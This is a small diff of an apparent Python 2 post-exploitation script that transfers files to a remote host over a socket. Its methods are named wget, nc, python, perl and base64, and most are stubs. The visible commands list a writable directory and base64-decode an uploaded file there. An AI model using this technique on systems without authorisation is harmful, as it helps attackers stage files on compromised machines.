@@ -15,18 +15,23 @@ def wget(s):
 	print "[+] File transfered (hopefully)"
 	s.send("ls -al "+writable_dir+"\n")
 	print s.recv(1024)
+	return
 
 def ftp(s):
 	print "ftp"
+	return
 
 def nc(s):
 	print "nc"
+	return
 
 def python(s):
 	print "python"
+	return
 
 def perl(s):
 	print "perl"
+	return
 
 def base64(s):
 	import base64
@@ -41,6 +46,7 @@ def base64(s):
 	time.sleep(2)
 	command = "base64 -d "+writable_dir+"/conn64.txt > "+writable_dir+"/"+output_file+"; rm "+writable_dir+"/conn64.txt\n" 
 	s.send(command)
+	return
 
 def main(s):
 	usable = []
